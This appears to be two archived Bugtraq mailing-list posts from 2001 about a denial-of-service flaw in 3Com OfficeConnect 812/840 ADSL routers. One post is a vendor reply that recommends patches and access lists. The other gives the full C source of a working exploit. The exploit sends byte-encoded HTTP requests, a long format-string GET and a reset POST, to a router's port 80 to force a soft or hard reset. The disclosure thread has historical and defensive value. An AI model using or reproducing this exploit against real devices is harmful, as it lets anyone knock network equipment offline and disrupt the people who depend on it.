=== Content from marc.info_bea5a172_20250124_165900.html ===

```
[[prev in list](?l=bugtraq&m=100135157028843&w=2)] [[next in list](?l=bugtraq&m=100138043020855&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=100143838524645&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Regarding: 3Com OfficeConnect 812/840 Router DoS exploit code](?t=100137300300002&r=1&w=2)
From:       [Tom_Kinahan () ne ! 3com ! com](?a=100137306500002&r=1&w=2)
Date:       [2001-09-24 18:14:00](?l=bugtraq&r=1&w=2&b=200109)
[Download RAW [message](?l=bugtraq&m=100137290421828&q=mbox) or [body](?l=bugtraq&m=100137290421828&q=raw)]

Hello,

 As the Product Manager of the 3Com Office Connect Remote 812 and 840, I have
the following response:

 It appears that both individuals posting on these products have not taken the
opportunity to download the software patch for the OCR812 router software
version 1.1.9. In responding to the specific points below, however, it is
certainly possible to employ port filtering on the WAN interface for ports 23
and 53 if the customer desires, following the same methodology as the port 80
filter available on the 3Com web site
(<http://support.3com.com/infodeli/tools/remote/ocradsl/http_filtering.pdf>).

 More to the point however, our customers have requested that these routers be
managed remotely from the WAN by default. In most cases, they also employ
another method supported on these products called access lists. Access lists
will only allow ip addresses in the range configured to access the management
interfaces. For details on Access Lists see the Command Line Interface manual
available at:

<http://support.3com.com/infodeli/tools/remote/ocradsl/20/812_cli20.pdf>

 Page 6-31 details how access lists are configured.

 I suggest that if access lists are used and used properly, the DoS issues below
 do not exist.

The OCR840 never had a software version as indicated below. What version was
this verified against?

-Tom Kinahan
Product Manager
OCR812/OCR840/OCR612

>
> ----- Original Message -----
> "BugTraq" <BUGTRAQ@SECURITYFOCUS.COM>
> Sent: Sunday, September 23, 2001 11:09 AM
> Subject: Re: 3Com OfficeConnect 812/840 Router DoS exploit code

> > // 3Com OfficeConnect 812/840 ADSL Router Denial of Service (maybe others)

> Filtering port 80 on the WAN interface is enough to prevent this DoS. Port
> 53 UDP and port 23 telnet are also wide open by default. In fact, this is
> (IMHO) a bad symptom of lack of care in security.

> As another issue, 3com 812 ADSL routers do NAT. This is great since you plug
> in up to 40 PCs and do not have to care very much about settings. However,
> the TCP/IP stack of these routers shamelessly uses fixed-increment ISNs on
> packets, thus making a connection hijack / spoofing attack fairly simple.
> Since they do NAT, every outbound packet suffers of this "carelessness".

> I hope that someone from 3com hears us here... since on their whole site
> there is NO SECURITY CONTACT whatsoever. This is another bad sign for a
> network hardware vendor.

> Stefano "Raistlin" Zanero
> System Administrator Gioco.Net
> public PGP key block at <http://gioco.net/pgpkeys>

> --------------------------------------------------------------------------------------------------------------------
>  // 3Com OfficeConnect 812/840 ADSL Router Denial of Service (maybe others)
> // security is weak
> // Written pour sniffer <sniffer@sniffer.net>
> // Fri Sep 21 15:51:35 BRT 2001
> // Viva Brazil!

> vulnerable
> 3com OfficeConnect DSL Router 812 1.1.7
> 3com OfficeConnect DSL Router 840 1.1.7

> .---.        .----------    Bruno Lacerda Ratnieks,
> /     \  __  /    ------    Technical Comm Developer
> / /     \(  )/    -----     Openweb Consultoria e Desen.
> //////   ' \/ `   ---

««-»»
>  //// / // :    : ---        email: bruno@sniffer.net
> // /   /  /`    '--         mobile: (51) 983-665-40
>//          //..\\          icq: 11111117
>       ====UU====UU====    ««-»»
>           '//||\\`

[[prev in list](?l=bugtraq&m=100135157028843&w=2)] [[next in list](?l=bugtraq&m=100138043020855&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=100143838524645&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_2d95d848_20250124_165859.html ===

```
[[prev in list](?l=bugtraq&m=100119569624183&w=2)] [[next in list](?l=bugtraq&m=100119633925473&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=100126058603227&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [3Com OfficeConnect 812/840  Router DoS exploit code](?t=100119574800005&r=1&w=2)
From:       ["Bruno Ratnieks" <sniffer () sniffer ! net>](?a=100119584100002&r=1&w=2)
Date:       [2001-09-21 22:25:17](?l=bugtraq&r=1&w=2&b=200109)
[Download RAW [message](?l=bugtraq&m=100119572524232&q=mbox) or [body](?l=bugtraq&m=100119572524232&q=raw)]

// 3Com OfficeConnect 812/840 ADSL Router Denial of Service (maybe others)
// security is weak
// Written pour sniffer <sniffer@sniffer.net>
// Fri Sep 21 15:51:35 BRT 2001
// Viva Brazil!

vulnerable
    3com OfficeConnect DSL Router 812 1.1.7
    3com OfficeConnect DSL Router 840 1.1.7

      .---.        .----------    Bruno Lacerda Ratnieks,
     /     \  __  /    ------    Technical Comm Developer
    / /     \(  )/    -----     Openweb Consultoria e Desen.
   //////   ' \/ `   ---       ««-»»
  //// / // :    : ---        email: bruno@sniffer.net
 // /   /  /`    '--         mobile: (51) 983-665-40
//          //..\\          icq: 11111117
       ====UU====UU====    ««-»»
           '//||\\`

[["adsl812-denial.c" (application/octet-stream)]](?l=bugtraq&m=100119572524232&q=p3)

// 3Com OfficeConnect 812/840 ADSL Router Denial of Service (maybe others)
// Proof of concept, soft and hard reset, the security is weak
// Written pour sniffer <sniffer@sniffer.net>
// Fri Sep 21 15:51:35 BRT 2001
// Viva Brazil!

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

void
usage(binary)
char *binary;
{
fprintf(stderr,"3Com OfficeConnect 812 ADSL Router Denial of Service (%s)\nsniffer \
<sniffer@sniffer.net>\n\t%s <1 (soft) || 2 (hard)> <remote router>\n", __FILE__, \
binary); }
int
main(argc, argv)
int argc;
char **argv;
{
int sockfd;
char senddata[1024];
char hardreset_data[] = {
									 71,69,84,32,47,103,114,97,112,104,105,99,115,
                   47,115,109,108,51,99,111,109,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,32,72,84,84,80,
                   47,49,46,48,10,10,0 };
char softreset_data[] = {
                   80,79,83,84,32,47,70,111,114,109,115,47,97,
                   100,115,108,95,114,101,115,101,116,32,72,84,84,
                   80,47,49,46,49,10,72,111,115,116,58,32,49,
                   57,50,46,49,54,56,46,49,46,50,53,52,10,
                   67,111,110,110,101,99,116,105,111,110,58,32,99,
                   108,111,115,101,10,67,111,110,116,101,110,116,45,
                   76,101,110,103,116,104,58,32,49,57,10,10,83,
                   117,98,109,105,116,61,82,101,115,101,116,37,50,
                   48,76,105,110,101,10,10,0 };
struct hostent *he;
struct sockaddr_in their_addr;

if( argc != 3 )
{
	usage(argv[[0]](#0));
	exit(0);
}
if( atoi(argv[[1]](#1)) >= 3 || atoi(argv[[1]](#1)) == 0 )
{
	  usage(argv[[0]](#0));
		exit(0);
}
if((he=gethostbyname(argv[[2]](#2))) == NULL)
{
	herror("gethostbyname");
	exit(1);
}

their_addr.sin_family = AF_INET;
their_addr.sin_port = htons(80);
their_addr.sin_addr = (*(struct in_addr *)he->h_addr);
bzero(&their_addr.sin_zero, 8);

if ((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1)
{
	perror("socket");
	exit(1);
}

if(connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1)
{
	perror("connect");
	exit(1);
}
else
{
	printf("connected\n");
}
if(atoi(argv[[1]](#1)) == 1)
	strncpy(senddata, softreset_data, strlen(softreset_data));
else if(atoi(argv[[1]](#1)) == 2)
	strncpy(senddata, hardreset_data, strlen(hardreset_data));

if(send(sockfd, senddata, sizeof(senddata), 0) == -1)
{
	perror("send");
	exit(1);
}
else
{
	printf("evil data sent\n.. have a rice day\n");
}

close(sockfd);
return(0);
}

[[prev in list](?l=bugtraq&m=100119569624183&w=2)] [[next in list](?l=bugtraq&m=100119633925473&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=100126058603227&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


